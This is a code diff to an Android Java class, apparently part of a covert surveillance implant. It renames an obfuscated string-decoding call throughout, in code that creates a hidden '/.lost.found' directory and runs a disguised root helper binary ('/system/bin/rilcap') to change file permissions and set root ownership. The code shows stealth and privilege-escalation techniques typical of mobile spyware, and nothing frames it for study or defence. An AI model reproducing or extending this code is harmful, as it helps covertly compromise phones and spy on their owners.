@@ -134,10 +134,10 @@ public class Path {
 		}
 
 		if (mExternalStorageWriteable && Cfg.USE_SD) {
-			hidden = Environment.getExternalStorageDirectory() + M.d("/.lost.found") + "/"; //$NON-NLS-1$ //$NON-NLS-2$
+			hidden = Environment.getExternalStorageDirectory() + M.e("/.lost.found") + "/"; //$NON-NLS-1$ //$NON-NLS-2$
 		} else {
 
-			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.d("/.lost.found") + "/";
+			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/.lost.found") + "/";
 
 		}
 
@@ -236,19 +236,19 @@ public class Path {
 					return true;
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + M.d("/system/bin/rilcap pzm 777 ") + " " + path);
+					Check.log(TAG + " (unprotect): " + M.e("/system/bin/rilcap pzm 777 ") + " " + path);
 				}
 				// h_9=/system/bin/ntpsvd pzm 777
-				Runtime.getRuntime().exec(M.d("/system/bin/rilcap pzm 777 ") + " " + path);
+				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 777 ") + " " + path);
 			} else {
 				if (file.exists() && file.canRead()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + M.d("/system/bin/rilcap pzm 755 ") + " " + path);
+					Check.log(TAG + " (unprotect): " + M.e("/system/bin/rilcap pzm 755 ") + " " + path);
 				}
 				// h_3=/system/bin/ntpsvd pzm 755
-				Runtime.getRuntime().exec(M.d("/system/bin/rilcap pzm 755 ") + " " + path);
+				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 755 ") + " " + path);
 			}
 
 			return file.canRead();
@@ -282,10 +282,10 @@ public class Path {
 	public static boolean lock(String path) {
 		try {
 			// h_10=/system/bin/ntpsvd pzm 000
-			Runtime.getRuntime().exec(M.d("/system/bin/rilcap pzm 000 ") + path);
+			Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 000 ") + path);
 
 			// h_11=/system/bin/ntpsvd fho root root
-			Runtime.getRuntime().exec(M.d("/system/bin/rilcap fho root root ") + path);
+			Runtime.getRuntime().exec(M.e("/system/bin/rilcap fho root root ") + path);
 
 			return true;
 		} catch (IOException ex) {
